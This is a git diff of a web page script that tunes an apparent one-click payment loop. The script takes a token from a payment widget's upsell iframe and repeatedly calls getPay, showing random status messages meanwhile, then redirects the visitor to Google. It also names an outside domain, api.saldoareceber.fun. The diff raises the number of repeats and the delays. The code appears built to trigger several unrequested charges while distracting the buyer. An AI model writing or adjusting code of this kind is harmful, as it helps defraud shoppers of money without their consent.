@@ -71,7 +71,7 @@
     <script src="https://pepper.com.br/oneclick.js"></script>
     <script>
         const pepperBtn = document.querySelector('.pepperBtn');
-        let qty = 5;
+        let qty = 7;
         let cont = 0;
         let site = 'https://google.com.br'
         let yourdomain = 'https://api.saldoareceber.fun'
@@ -86,11 +86,11 @@
 
         setTimeout(() => {
             getPay()
-        }, 2000);
+        }, 3500);
 
         setInterval(() => {
             document.getElementById('status').innerHTML = messages[Math.floor(Math.random() * messages.length)]
-        }, 2000);
+        }, 3500);
 
         function getPay() {
             minhaString = document.querySelector('iframe').src.replace('https://pepper.com.br/upsell.html', '')
@@ -109,7 +109,7 @@
             if (cont <= qty) {
                 setTimeout(() => {
                     getPay()
-                }, 2000);
+                }, 3500);
             } else {
                 window.location.href = site
             }
